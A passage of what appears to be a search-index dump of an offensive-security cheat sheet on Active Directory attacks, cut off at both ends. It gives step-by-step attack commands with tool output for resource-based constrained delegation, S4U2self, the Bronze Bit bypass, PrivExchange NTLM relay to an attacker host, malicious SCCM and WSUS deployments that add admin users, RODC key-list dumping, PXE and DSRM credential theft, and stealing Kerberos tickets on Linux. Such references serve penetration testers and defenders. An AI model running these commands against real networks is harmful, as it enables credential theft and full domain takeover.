\\\\dc01.offense.local\\c$\n</code></pre></p>"},{"location":"active-directory/active-directory-attacks/#kerberos-resource-based-constrained-delegation","title":"Kerberos Resource Based Constrained Delegation","text":"<p>Resource-based Constrained Delegation was introduced in Windows Server 2012. </p> <p>The user sends a Service Ticket (ST) to access the service (\"Service A\"), and if the service is allowed to delegate to another pre-defined service (\"Service B\"), then Service A can present to the authentication service the TGS that the user provided and obtain a ST for the user to Service B.  https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html 1. Import Powermad and Powerview <pre><code>PowerShell.exe -ExecutionPolicy Bypass\nImport-Module .\\powermad.ps1\nImport-Module .\\powerview.ps1\n</code></pre> 2. Get user SID     <pre><code>$AttackerSID = Get-DomainUser SvcJoinComputerToDom -Properties objectsid | Select -Expand objectsid\n$ACE = Get-DomainObjectACL dc01-ww2.factory.lan | ?{$_.SecurityIdentifier -match $AttackerSID}\n$ACE\nConvertFrom-SID $ACE.SecurityIdentifier\n</code></pre> 3. Abuse MachineAccountQuota to create a computer account and set an SPN for it     <pre><code>New-MachineAccount -MachineAccount swktest -Password $(ConvertTo-SecureString 'Weakest123*' -AsPlainText -Force)\n</code></pre> 4. Rewrite DC's AllowedToActOnBehalfOfOtherIdentity properties     <pre><code>$ComputerSid = Get-DomainComputer swktest -Properties objectsid | Select -Expand objectsid\n$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList \"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))\"\n$SDBytes = New-Object byte[] ($SD.BinaryLength)\n$SD.GetBinaryForm($SDBytes, 0)\nGet-DomainComputer dc01-ww2.factory.lan | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}\n$RawBytes = Get-DomainComputer dc01-ww2.factory.lan -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity\n$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0\n$Descriptor.DiscretionaryAcl\n</code></pre> <pre><code># alternative\n$SID_FROM_PREVIOUS_COMMAND = Get-DomainComputer MACHINE_ACCOUNT_NAME -Properties objectsid | Select -Expand objectsid\n$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList \"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$SID_FROM_PREVIOUS_COMMAND)\"; $SDBytes = New-Object byte[] ($SD.BinaryLength); $SD.GetBinaryForm($SDBytes, 0); Get-DomainComputer DC01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}\n# alternative\nStandIn_Net35.exe --computer dc01 --sid SID_FROM_PREVIOUS_COMMAND\n</code></pre> 5. Use Rubeus to get hash from password     <pre><code>Rubeus.exe hash /password:'Weakest123*' /user:swktest$  /domain:factory.lan\n[*] Input password             : Weakest123*\n[*] Input username             : swktest$\n[*] Input domain               : factory.lan\n[*] Salt                       : FACTORY.LANswktest\n[*]       rc4_hmac             : F8E064CA98539B735600714A1F1907DD\n[*]       aes128_cts_hmac_sha1 : D45DEADECB703CFE3774F2AA20DB9498\n[*]       aes256_cts_hmac_sha1 : 0129D24B2793DD66BAF3E979500D8B313444B4D3004DE676FA6AFEAC1AC5C347\n[*]       des_cbc_md5          : BA297CFD07E62A5E\n</code></pre> 6. Impersonate domain admin using our newly created machine account     <pre><code>.\\Rubeus.exe s4u /user:swktest$ /rc4:F8E064CA98539B735600714A1F1907DD /impersonateuser:Administrator /msdsspn:cifs/dc01-ww2.factory.lan /ptt /altservice:cifs,http,host,rpcss,wsman,ldap\n.\\Rubeus.exe s4u /user:swktest$ /aes256:0129D24B2793DD66BAF3E979500D8B313444B4D3004DE676FA6AFEAC1AC5C347 /impersonateuser:Administrator /msdsspn:cifs/dc01-ww2.factory.lan /ptt /altservice:cifs,http,host,rpcss,wsman,ldap\n[*] Impersonating user 'Administrator' to target SPN 'cifs/dc01-ww2.factory.lan'\n[*] Using domain controller: DC01-WW2.factory.lan (172.16.42.5)\n[*] Building S4U2proxy request for service: 'cifs/dc01-ww2.factory.lan'\n[*] Sending S4U2proxy request\n[+] S4U2proxy success!\n[*] base64(ticket.kirbi) for SPN 'cifs/dc01-ww2.factory.lan':\n    doIGXDCCBligAwIBBaEDAgEWooIFXDCCBVhhggVUMIIFUKADAgEFoQ0bC0ZBQ1RPUlkuTEFOoicwJaAD\n    AgECoR4wHBsEY2lmcxsUZGMwMS[...]PMIIFC6ADAgESoQMCAQOiggT9BIIE\n    LmZhY3RvcnkubGFu\n[*] Action: Import Ticket\n[+] Ticket successfully imported!\n</code></pre></p>"},{"location":"active-directory/active-directory-attacks/#kerberos-service-for-user-extension","title":"Kerberos Service for User Extension","text":"<ul> <li>Service For User To Self which allows a service to obtain a TGS on behalf of another user</li> <li>Service For User To Proxy which allows a service to obtain a TGS on behalf of another user on another service</li> </ul>"},{"location":"active-directory/active-directory-attacks/#s4u2self-privilege-escalation","title":"S4U2self - Privilege Escalation","text":"<ol> <li>Get a TGT <ul> <li>Using Unconstrained Delegation</li> <li>Using the current machine account: <code>Rubeus.exe tgtdeleg /nowrap</code></li> </ul> </li> <li>Use that TGT to make a S4U2self request in order to obtain a Service Ticket as domain admin for the machine.     <pre><code>Rubeus.exe s4u /self /nowrap /impersonateuser:\"Administrator\" /altservice:\"cifs/srv001.domain.local\" /ticket:\"base64ticket\"\nRubeus.exe ptt /ticket:\"base64ticket\"\nRubeus.exe s4u /self /nowrap /impersonateuser:\"Administrator\" /altservice:\"cifs/srv001\" /ticket:\"base64ticket\" /ptt\n</code></pre> The \"Network Service\" account and the AppPool identities can act as the computer account in terms of Active Directory, they are only restrained locally. Therefore it is possible to invoke S4U2self if you run as one of these and request a service ticket for any user (e.g. someone with local admin rights, like DA) to yourself. <pre><code># The Rubeus execution will fail when trying the S4UProxy step, but the ticket generated by S4USelf will be printed.\nRubeus.exe s4u /user:${computerAccount} /msdsspn:cifs/${computerDNS} /impersonateuser:${localAdmin} /ticket:${TGT} /nowrap\n# The service name is not included in the TGS ciphered data and can be modified at will.\nRubeus.exe tgssub /ticket:${ticket} /altservice:cifs/${ServerDNSName} /ptt\n</code></pre></li> </ol>"},{"location":"active-directory/active-directory-attacks/#kerberos-bronze-bit-attack-cve-2020-17049","title":"Kerberos Bronze Bit Attack - CVE-2020-17049","text":"<p>An attacker can impersonate users which are not allowed to be delegated. This includes members of the Protected Users group and any other users explicitly configured as sensitive and cannot be delegated. Patch is out on November 10, 2020, DC are most likely vulnerable until February 2021.  Patched Error Message : <code>[-] Kerberos SessionError: KRB_AP_ERR_MODIFIED(Message stream modified)</code> Requirements: * Service account's password hash  * Service account's with <code>Constrained Delegation</code> or <code>Resource Based Constrained Delegation</code> * Impacket PR #1013 Attack #1 - Bypass the <code>Trust this user for delegation to specified services only \u2013 Use Kerberos only</code> protection and impersonate a user who is protected from delegation. <pre><code># forwardable flag is only protected by the ticket encryption which uses the service account's password \n$ getST.py -spn cifs/Service2.test.local -impersonate Administrator -hashes &lt;LM:NTLM hash&gt; -aesKey &lt;AES hash&gt; test.local/Service1 -force-forwardable -dc-ip &lt;Domain controller&gt; # -&gt; Forwardable\n$ getST.py -spn cifs/Service2.test.local -impersonate User2 -hashes aad3b435b51404eeaad3b435b51404ee:7c1673f58e7794c77dead3174b58b68f -aesKey 4ffe0c458ef7196e4991229b0e1c4a11129282afb117b02dc2f38f0312fc84b4 test.local/Service1 -force-forwardable\n# Load the ticket\n.\\mimikatz\\mimikatz.exe \"kerberos::ptc User2.ccache\" exit\n# Access \"c$\"\nls \\\\service2.test.local\\c$\n</code></pre> Attack #2 - Write Permissions to one or more objects in the AD <pre><code># Create a new machine account\nImport-Module .\\Powermad\\powermad.ps1\nNew-MachineAccount -MachineAccount AttackerService -Password $(ConvertTo-SecureString 'AttackerServicePassword' -AsPlainText -Force)\n.\\mimikatz\\mimikatz.exe \"kerberos::hash /password:AttackerServicePassword /user:AttackerService /domain:test.local\" exit\n# Set PrincipalsAllowedToDelegateToAccount\nInstall-WindowsFeature RSAT-AD-PowerShell\nImport-Module ActiveDirectory\nGet-ADComputer AttackerService\nSet-ADComputer Service2 -PrincipalsAllowedToDelegateToAccount AttackerService$\nGet-ADComputer Service2 -Properties PrincipalsAllowedToDelegateToAccount\n# Execute the attack\npython .\\impacket\\examples\\getST.py -spn cifs/Service2.test.local -impersonate User2 -hashes 830f8df592f48bc036ac79a2bb8036c5:830f8df592f48bc036ac79a2bb8036c5 -aesKey 2a62271bdc6226c1106c1ed8dcb554cbf46fb99dda304c472569218c125d9ffc test.local/AttackerService -force-forwardableet-ADComputer Service2 -PrincipalsAllowedToDelegateToAccount AttackerService$\n# Load the ticket\n.\\mimikatz\\mimikatz.exe \"kerberos::ptc User2.ccache\" exit | Out-Null\n</code></pre></p>"},{"location":"active-directory/active-directory-attacks/#privexchange-attack","title":"PrivExchange attack","text":"<p>Exchange your privileges for Domain Admin privs by abusing Exchange.    You need a shell on a user account with a mailbox. 1. Exchange server hostname or IP address     <pre><code>pth-net rpc group members \"Exchange Servers\" -I dc01.domain.local -U domain/username\n</code></pre> 2. Relay of the Exchange server authentication and privilege escalation (using ntlmrelayx from Impacket).     <pre><code>ntlmrelayx.py -t ldap://dc01.domain.local --escalate-user username\n</code></pre> 3. Subscription to the push notification feature (using privexchange.py or powerPriv), uses the credentials of the current user to authenticate to the Exchange server. Forcing the Exchange server's to send back its NTLMv2 hash to a controlled machine.     <pre><code># https://github.com/dirkjanm/PrivExchange/blob/master/privexchange.py\npython privexchange.py -ah xxxxxxx -u xxxx -d xxxxx\npython privexchange.py -ah 10.0.0.2 mail01.domain.local -d domain.local -u user_exchange -p pass_exchange\n\n# https://github.com/G0ldenGunSec/PowerPriv \npowerPriv -targetHost corpExch01 -attackerHost 192.168.1.17 -Version 2016\n</code></pre> 4. Profit using secretdumps from Impacket, the user can now perform a dcsync and get another user's NTLM hash     <pre><code>python secretsdump.py xxxxxxxxxx -just-dc\npython secretsdump.py lab/buff@192.168.0.2 -ntds ntds -history -just-dc-ntlm\n</code></pre> 5. Clean your mess and restore a previous state of the user's ACL     <pre><code>python aclpwn.py --restore ../aclpwn-20190319-125741.restore\n</code></pre> Alternatively you can use the Metasploit module  <code>use auxiliary/scanner/http/exchange_web_server_pushsubscription</code> Alternatively you can use an all-in-one tool : Exchange2domain. <pre><code>git clone github.com/Ridter/Exchange2domain \npython Exchange2domain.py -ah attackterip -ap listenport -u user -p password -d domain.com -th DCip MailServerip\npython Exchange2domain.py -ah attackterip -u user -p password -d domain.com -th DCip --just-dc-user krbtgt MailServerip\n</code></pre></p>"},{"location":"active-directory/active-directory-attacks/#sccm-deployment","title":"SCCM Deployment","text":"<p>SCCM is a solution from Microsoft to enhance administration in a scalable way across an organisation. * PowerSCCM - PowerShell module to interact with SCCM deployments * MalSCCM - Abuse local or remote SCCM servers to deploy malicious applications to hosts they manage * Using SharpSCCM <pre><code>.\\SharpSCCM.exe get device --server &lt;SERVER8NAME&gt; --site-code &lt;SITE_CODE&gt;\n.\\SharpSCCM.exe &lt;server&gt; &lt;sitecode&gt; exec -d &lt;device_name&gt; -r &lt;relay_server_ip&gt;\n.\\SharpSCCM.exe exec -d WS01 -p \"C:\\Windows\\System32\\ping 10.10.10.10\" -s --debug\n</code></pre> * Compromise client, use locate to find management server      <pre><code>MalSCCM.exe locate\n</code></pre> * Enumerate over WMI as an administrator of the Distribution Point     <pre><code>MalSCCM.exe inspect /server:&lt;DistributionPoint Server FQDN&gt; /groups\n</code></pre> * Compromise management server, use locate to find primary server * Use <code>inspect</code> on primary server to view who you can target     <pre><code>MalSCCM.exe inspect /all\nMalSCCM.exe inspect /computers\nMalSCCM.exe inspect /primaryusers\nMalSCCM.exe inspect /groups\n</code></pre> * Create a new device group for the machines you want to laterally move too     <pre><code>MalSCCM.exe group /create /groupname:TargetGroup /grouptype:device\nMalSCCM.exe inspect /groups\n</code></pre> * Add your targets into the new group      <pre><code>MalSCCM.exe group /addhost /groupname:TargetGroup /host:WIN2016-SQL\n</code></pre> * Create an application pointing to a malicious EXE on a world readable share : <code>SCCMContentLib$</code> <pre><code>MalSCCM.exe app /create /name:demoapp /uncpath:\"\\\\BLORE-SCCM\\SCCMContentLib$\\localthread.exe\"\nMalSCCM.exe inspect /applications\n</code></pre> * Deploy the application to the target group      <pre><code>MalSCCM.exe app /deploy /name:demoapp /groupname:TargetGroup /assignmentname:demodeployment\nMalSCCM.exe inspect /deployments\n</code></pre> * Force the target group to checkin for updates      <pre><code>MalSCCM.exe checkin /groupname:TargetGroup\n</code></pre> * Cleanup the application, deployment and group     <pre><code>MalSCCM.exe app /cleanup /name:demoapp\nMalSCCM.exe group /delete /groupname:TargetGroup\n</code></pre></p>"},{"location":"active-directory/active-directory-attacks/#sccm-network-access-accounts","title":"SCCM Network Access Accounts","text":"<p>If you can escalate on a host that is an SCCM client, you can retrieve plaintext domain credentials. On the machine. * Find SCCM blob     <pre><code>Get-Wmiobject -namespace \"root\\ccm\\policy\\Machine\\ActualConfig\" -class \"CCM_NetworkAccessAccount\"\nNetworkAccessPassword : &lt;![CDATA[E600000001...8C6B5]]&gt;\nNetworkAccessUsername : &lt;![CDATA[E600000001...00F92]]&gt;\n</code></pre> * Using GhostPack/SharpDPAPI or Mayyhem/SharpSCCM for SCCM retrieval and decryption     <pre><code>.\\SharpDPAPI.exe SCCM\n.\\SharpSCCM.exe get naa -u USERNAME -p PASSWORD\n</code></pre> * Check ACL for the CIM repository located at <code>C:\\Windows\\System32\\wbem\\Repository\\OBJECTS.DATA</code>:     <pre><code>Get-Acl C:\\Windows\\System32\\wbem\\Repository\\OBJECTS.DATA | Format-List -Property PSPath,sddl\nConvertFrom-SddlString \"\"\n</code></pre> From a remote machine. * Using garrettfoster13/sccmhunter <pre><code>python3 ./sccmhunter.py http -u \"administrator\" -p \"P@ssw0rd\" -d internal.lab -dc-ip 10.10.10.10. -auto\n</code></pre></p>"},{"location":"active-directory/active-directory-attacks/#sccm-shares","title":"SCCM Shares","text":"<p>Find interesting files stored on (System Center) Configuration Manager (SCCM/CM) SMB shares * 1njected/CMLoot <pre><code>Invoke-CMLootInventory -SCCMHost sccm01.domain.local -Outfile sccmfiles.txt\nInvoke-CMLootDownload -SingleFile \\\\sccm\\SCCMContentLib$\\DataLib\\SC100001.1\\x86\\MigApp.xml\nInvoke-CMLootDownload -InventoryFile .\\sccmfiles.txt -Extension msi\n</code></pre></p>"},{"location":"active-directory/active-directory-attacks/#wsus-deployment","title":"WSUS Deployment","text":"<p>Windows Server Update Services (WSUS) enables information technology administrators to deploy the latest Microsoft product updates. You can use WSUS to fully manage the distribution of updates that are released through Microsoft Update to computers on your network  The payload must be a Microsoft signed binary and must point to a location on disk for the WSUS server to load that binary. * SharpWSUS 1. Locate using <code>HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate</code> or <code>SharpWSUS.exe locate</code> 2. After WSUS Server compromise: <code>SharpWSUS.exe inspect</code> 3. Create a malicious patch: <code>SharpWSUS.exe create /payload:\"C:\\Users\\ben\\Documents\\pk\\psexec.exe\" /args:\"-accepteula -s -d cmd.exe /c \\\"net user WSUSDemo Password123! /add ^&amp; net localgroup administrators WSUSDemo /add\\\"\" /title:\"WSUSDemo\"</code> 4. Deploy it on the target: <code>SharpWSUS.exe approve /updateid:5d667dfd-c8f0-484d-8835-59138ac0e127 /computername:bloredc2.blorebank.local /groupname:\"Demo Group\"</code> 5. Check status deployment: <code>SharpWSUS.exe check /updateid:5d667dfd-c8f0-484d-8835-59138ac0e127 /computername:bloredc2.blorebank.local</code> 6. Clean up: <code>SharpWSUS.exe delete /updateid:5d667dfd-c8f0-484d-8835-59138ac0e127 /computername:bloredc2.blorebank.local /groupname:\u201dDemo Group</code></p>"},{"location":"active-directory/active-directory-attacks/#rodc-read-only-domain-controller","title":"RODC - Read Only Domain Controller","text":"<p>RODCs are an alternative for Domain Controllers in less secure physical locations - Contains a filtered copy of AD (LAPS and Bitlocker keys are excluded) - Any user or group specified in the managedBy attribute of an RODC has local admin access to the RODC server</p>"},{"location":"active-directory/active-directory-attacks/#rodc-golden-ticket","title":"RODC Golden Ticket","text":"<ul> <li>You can forge an RODC golden ticket and present it to a writable Domain Controller only for principals listed in the RODC\u2019s msDS-RevealOnDemandGroup attribute and not in the RODC\u2019s msDS-NeverRevealGroup attribute</li> </ul>"},{"location":"active-directory/active-directory-attacks/#rodc-key-list-attack","title":"RODC Key List Attack","text":"<p>Requirements: * Impacket PR #1210 - The Kerberos Key List Attack * krbtgt credentials of the RODC (-rodcKey)  * ID of the krbtgt account of the RODC (-rodcNo) * using Impacket   <pre><code># keylistattack.py using SAMR user enumeration without filtering (-full flag)\nkeylistattack.py DOMAIN/user:password@host -rodcNo XXXXX -rodcKey XXXXXXXXXXXXXXXXXXXX -full\n# keylistattack.py defining a target username (-t flag)\nkeylistattack.py -kdc server.domain.local -t user -rodcNo XXXXX -rodcKey XXXXXXXXXXXXXXXXXXXX LIST\n# secretsdump.py using the Kerberos Key List Attack option (-use-keylist)\nsecretsdump.py DOMAIN/user:password@host -rodcNo XXXXX -rodcKey XXXXXXXXXXXXXXXXXXXX -use-keylist\n</code></pre> * Using Rubeus   <pre><code>Rubeus.exe golden /rodcNumber:25078 /aes256:eacd894dd0d934e84de35860ce06a4fac591ca63c228ddc1c7a0ebbfa64c7545 /user:admin /id:1136 /domain:lab.local /sid:S-1-5-21-1437000690-1664695696-1586295871\nRubeus.exe asktgs /enctype:aes256 /keyList /service:krbtgt/lab.local /dc:dc1.lab.local /ticket:doIFgzCC[...]wIBBxhYnM=\n</code></pre></p>"},{"location":"active-directory/active-directory-attacks/#rodc-computer-object","title":"RODC Computer Object","text":"<p>When you have one the following permissions to the RODC computer object: GenericWrite, GenericAll, WriteDacl, Owns, WriteOwner, WriteProperty. * Add a domain admin account to the RODC's msDS-RevealOnDemandGroup attribute    <pre><code>PowerSploit&gt; Set-DomainObject -Identity RODC$ -Set @{'msDS-RevealOnDemandGroup'=@('CN=Allowed RODC Password Replication Group,CN=Users,DC=domain,DC=local', 'CN=Administrator,CN=Users,DC=domain,DC=local')}\n</code></pre></p>"},{"location":"active-directory/active-directory-attacks/#pxe-boot-image-attack","title":"PXE Boot image attack","text":"<p>PXE allows a workstation to boot from the network by retrieving an operating system image from a server using TFTP (Trivial FTP) protocol. This boot over the network allows an attacker to fetch the image and interact with it. - Press [F8] during the PXE boot to spawn an administrator console on the deployed machine. - Press [SHIFT+F10] during the initial Windows setup process to bring up a system console, then add a local administrator or dump SAM/SYSTEM registry.     <pre><code>net user hacker Password123! /add\nnet localgroup administrators /add hacker\n</code></pre> - Extract the pre-boot image (wim files) using PowerPXE.ps1 (https://github.com/wavestone-cdt/powerpxe) and dig through it to find default passwords and domain accounts.     <pre><code># Import the module\nPS &gt; Import-Module .\\PowerPXE.ps1\n# Start the exploit on the Ethernet interface\nPS &gt; Get-PXEcreds -InterfaceAlias Ethernet\nPS &gt; Get-PXECreds -InterfaceAlias \u00ab lab 0 \u00bb \n# Wait for the DHCP to get an address\n&gt;&gt; Get a valid IP address\n&gt;&gt;&gt; &gt;&gt;&gt; DHCP proposal IP address: 192.168.22.101\n&gt;&gt;&gt; &gt;&gt;&gt; DHCP Validation: DHCPACK\n&gt;&gt;&gt; &gt;&gt;&gt; IP address configured: 192.168.22.101\n# Extract BCD path from the DHCP response\n&gt;&gt; Request BCD File path\n&gt;&gt;&gt; &gt;&gt;&gt; BCD File path:  \\Tmp\\x86x64{5AF4E332-C90A-4015-9BA2-F8A7C9FF04E6}.bcd\n&gt;&gt;&gt; &gt;&gt;&gt; TFTP IP Address:  192.168.22.3\n# Download the BCD file and extract wim files\n&gt;&gt; Launch TFTP download\n&gt;&gt;&gt;&gt; Transfer succeeded.\n&gt;&gt; Parse the BCD file: conf.bcd\n&gt;&gt;&gt;&gt; Identify wim file : \\Boot\\x86\\Images\\LiteTouchPE_x86.wim\n&gt;&gt;&gt;&gt; Identify wim file : \\Boot\\x64\\Images\\LiteTouchPE_x64.wim\n&gt;&gt; Launch TFTP download\n&gt;&gt;&gt;&gt; Transfer succeeded.\n# Parse wim files to find interesting data\n&gt;&gt; Open LiteTouchPE_x86.wim\n&gt;&gt;&gt;&gt; Finding Bootstrap.ini\n&gt;&gt;&gt;&gt; &gt;&gt;&gt;&gt; DeployRoot = \\\\LAB-MDT\\DeploymentShare$\n&gt;&gt;&gt;&gt; &gt;&gt;&gt;&gt; UserID = MdtService\n&gt;&gt;&gt;&gt; &gt;&gt;&gt;&gt; UserPassword = Somepass1\n</code></pre></p>"},{"location":"active-directory/active-directory-attacks/#dns-reconnaissance","title":"DNS Reconnaissance","text":"<p>Perform ADIDNS searches <pre><code>StandIn.exe --dns --limit 20\nStandIn.exe --dns --filter SQL --limit 10\nStandIn.exe --dns --forest --domain redhook --user RFludd --pass Cl4vi$Alchemi4e\nStandIn.exe --dns --legacy --domain redhook --user RFludd --pass Cl4vi$Alchemi4e\n</code></pre></p>"},{"location":"active-directory/active-directory-attacks/#dsrm-credentials","title":"DSRM Credentials","text":"<p>Directory Services Restore Mode (DSRM) is a safe mode boot option for Windows Server domain controllers. DSRM allows an administrator to repair or recover to repair or restore an Active Directory database. This is the local administrator account inside each DC. Having admin privileges in this machine, you can use mimikatz to dump the local Administrator hash. Then, modifying a registry to activate this password so you can remotely access to this local Administrator user. <pre><code>Invoke-Mimikatz -Command '\"token::elevate\" \"lsadump::sam\"'\n# Check if the key exists and get the value\nGet-ItemProperty \"HKLM:\\SYSTEM\\CURRENTCONTROLSET\\CONTROL\\LSA\" -name DsrmAdminLogonBehavior \n# Create key with value \"2\" if it doesn't exist\nNew-ItemProperty \"HKLM:\\SYSTEM\\CURRENTCONTROLSET\\CONTROL\\LSA\" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD \n# Change value to \"2\"\nSet-ItemProperty \"HKLM:\\SYSTEM\\CURRENTCONTROLSET\\CONTROL\\LSA\" -name DsrmAdminLogonBehavior -value 2\n</code></pre></p>"},{"location":"active-directory/active-directory-attacks/#linux-active-directory","title":"Linux Active Directory","text":""},{"location":"active-directory/active-directory-attacks/#ccache-ticket-reuse-from-tmp","title":"CCACHE ticket reuse from /tmp","text":"<p>When tickets are set to be stored as a file on disk, the standard format and type is a CCACHE file. This is a simple binary file format to store Kerberos credentials. These files are typically stored in /tmp and scoped with 600 permissions List the current ticket used for authentication with <code>env | grep KRB5CCNAME</code>. The format is portable and the ticket can be reused by setting the environment variable with <code>export KRB5CCNAME=/tmp/ticket.ccache</code>. Kerberos ticket name format is <code>krb5cc_%{uid}</code> where uid is the user UID.  <pre><code>$ ls /tmp/ | grep krb5cc\nkrb5cc_1000\nkrb5cc_1569901113\nkrb5cc_1569901115\n$ export KRB5CCNAME=/tmp/krb5cc_1569901115\n</code></pre></p>"},{"location":"active-directory/active-directory-attacks/#ccache-ticket-reuse-from-keyring","title":"CCACHE ticket reuse from keyring","text":"<p>Tool to extract Kerberos tickets from Linux kernel keys : https://github.com/TarlogicSecurity/tickey <pre><code># Configuration and build\ngit clone https://github.com/TarlogicSecurity/tickey\ncd tickey/tickey\nmake CONF=Release\n[root@Lab-LSV01 /]# /tmp/tickey -i\n[*] krb5 ccache_name = KEYRING:session:sess_%{uid}\n[+] root detected, so... DUMP ALL THE TICKETS!!\n[*] Trying to inject in tarlogic[1000] session...\n[+] Successful injection at process 25723 of tarlogic[1000],look for tickets in /tmp/__krb_1000.ccache\n[*] Trying to inject in velociraptor[1120601115] session...\n[+] Successful injection at process 25794 of velociraptor[1120601115],look for tickets in /tmp/__krb_1120601115.ccache\n[*] Trying to inject in trex[1120601113] session...\n[+] Successful injection at process 25820 of trex[1120601113],look for tickets in /tmp/__krb_1120601113.ccache\n[X] [uid:0] Error retrieving tickets\n</code></pre></p>"},{"location":"active-directory/active-directory-attacks/#ccache-ticket-reuse-from-sssd-kcm","title":"CCACHE ticket reuse from SSSD KCM","text":"<p>SSSD maintains a copy of the database at the path <code>/var/lib/sss/secrets/secrets.ldb</code>.  The corresponding key is stored as a hidden file at the path <code>/var/lib/sss/secrets/.secrets.mkey</code>.  By default, the key is only readable if you have root permissions. Invoking <code>SSSDKCMExtractor</code> with the --database and --key parameters will parse the database and decrypt the secrets. <pre><code>git clone https://github.com/fireeye/SSSDKCMExtractor\npython3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey\n</code></pre> The credential cache Kerberos blob can be converted into a usable Kerberos CCache file that can be passed to Mimikatz/Rubeus.</p>"},{"location":"active-directory/active-directory-attacks/#ccache-ticket-reuse-from-keytab","title":"CCACHE ticket reuse from keytab","text":"<pre><code>git clone https://github.com/its-a-feature/KeytabParser\npython KeytabParser.py /etc/krb5.keytab\nklist -k /etc/krb5.keytab\n</code></pre>"},{"location":"active-directory/active-directory-attacks/#extract-accounts-from-etckrb5keytab","title":"Extract accounts from /etc/krb5.keytab","text":"<p>The service keys used by services that run as root are usually stored in the keytab file /etc/krb5.keytab. This service key is the equivalent of the service's password, and must be kept secure.  Use <code>klist</code> to read the keytab file and parse its content. The key that you see when the key type is 23  is the actual NT Hash of the user. <pre><code>$ klist.exe -t -K -e -k FILE:C:\\Users\\User\\downloads\\krb5.keytab\n[...]\n[26] Service principal: host/COMPUTER@DOMAIN\n     KVNO: 25\n     Key type: 23\n     Key: 31d6cfe0d16ae931b73c59d7e0c089c0\n     Time stamp: Oct 07,  2019 09:12:02\n[...]\n</code></pre> On Linux you can use <code>KeyTabExtract</code>: we want RC4 HMAC hash to reuse the NLTM hash. <pre><code>$ python3 keytabextract.py krb5.keytab \n[!] No RC4-HMAC located. Unable to extract NTLM hashes. # No luck\n[+] Keytab File successfully imported.\n        REALM : DOMAIN\n        SERVICE PRINCIPAL : host/computer.domain\n        NTLM HASH : 31d6cfe0d16ae931b73c59d7e0c089c0 # Lucky\n</code></pre> On macOS you can use <code>bifrost</code>. <pre><code>./bifrost -action dump -source keytab -path test\n</code></pre> Connect to the machine using the account and the hash with CME. <pre><code>$ crackmapexec 10.XXX.XXX.XXX -u 'COMPUTER$' -H \"31d6cfe0d16ae931b73c59d7e0c089c0\" -d \"DOMAIN\"\nCME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\\COMPUTER$ 31d6cfe0d16ae931b73c59d7e0c089c0  \n</code></pre></p>"},{"location":"active-directory/active-directory-attacks/#extract-accounts-from-etcsssdsssdconf","title":"Extract accounts from /etc/sssd/sssd.conf","text":"<p>sss_obfuscate converts a given password into human-unreadable format and places it into appropriate domain section of the SSSD config file, usually located at /etc/sssd/sssd.conf The obfuscated password is put into \"ldap_default_authtok\" parameter of a given SSSD domain and the \"ldap_default_authtok_type\" parameter is set to \"obfuscated_password\".  <pre><code>[sssd]\nconfig_file_version = 2\n...\n[domain/LDAP]\n...\nldap_uri = ldap://127.0.0.1\nldap_search_base = ou=People,dc=srv,dc=world\nldap_default_authtok_type = obfuscated_password\nldap_default_authtok = [BASE64_ENCODED_TOKEN]\n</code></pre> De-obfuscate the content of the ldap_default_authtok variable with mludvig/sss_deobfuscate <pre><code>./sss_deobfuscate [ldap_default_authtok_base64_encoded]\n./sss_deobfuscate AAAQABagVAjf9KgUyIxTw3A+HUfbig7N1+L0qtY4xAULt2GYHFc1B3CBWGAE9ArooklBkpxQtROiyCGDQH+VzLHYmiIAAQID\n</code></pre></p>"},{"location":"active-directory/active-directory-attacks/#references","title":"References","text":"<ul> <li>Explain like I\u2019m 5: Kerberos - Apr 2, 2013 - @roguelynn</li> <li>Impersonating Office 365 Users With Mimikatz - January 15, 2017 - Michael Grafnetter</li> <li>Abusing Exchange: One API call away from Domain Admin - Dirk-jan Mollema</li> <li>Abusing Kerberos: Kerberoasting - Haboob Team</li> <li>Abusing S4U2Self: Another Sneaky Active Directory Persistence - Alsid</li> <li>Attacks Against Windows PXE Boot Images - February 13th, 2018 - Thomas Elling</li> <li>BUILDING AND ATTACKING AN ACTIVE DIRECTORY LAB WITH POWERSHELL - @myexploit2600 &amp; @5ub34x</li> <li>Becoming Darth Sidious: Creating a Windows Domain (Active Directory) and hacking it - @chryzsh</li> <li>BlueHat IL - Benjamin Delpy</li> <li>COMPROMISSION DES POSTES DE TRAVAIL GR\u00c2CE \u00c0 LAPS ET PXE MISC n\u00b0 103 - mai 2019 - R\u00e9mi Escourrou, Cyprien Oger </li> <li>Chump2Trump - AD Privesc talk at WAHCKon 2017 - @l0ss</li> <li>DiskShadow The return of VSS Evasion Persistence and AD DB extraction</li> <li>Domain Penetration Testing: Using BloodHound, Crackmapexec, &amp; Mimikatz to get Domain Admin</li> <li>Dumping Domain Password Hashes - Pentestlab</li> <li>Exploiting MS14-068 with PyKEK and Kali - 14 DEC 2014 - ZACH GRACE @ztgrace</li> <li>Exploiting PrivExchange - April 11, 2019 - @chryzsh</li> <li>Exploiting Unconstrained Delegation - Riccardo Ancarani - 28 APRIL 2019</li> <li>Finding Passwords in SYSVOL &amp; Exploiting Group Policy Preferences</li> <li>How Attackers Use Kerberos Silver Tickets to Exploit Systems - Sean Metcalf</li> <li>Fun with LDAP, Kerberos (and MSRPC) in AD Environments</li> <li>Getting the goods with CrackMapExec: Part 1, by byt3bl33d3r</li> <li>Getting the goods with CrackMapExec: Part 2, by byt3bl33d3r</li> <li>Golden ticket - Pentestlab</li> <li>How To Pass the Ticket Through SSH Tunnels - bluescreenofjeff</li> <li>Hunting in Active Directory: Unconstrained Delegation &amp; Forests Trusts - Roberto Rodriguez - Nov 28, 2018</li> <li>Invoke-Kerberoast - Powersploit Read the docs</li> <li>Kerberoasting - 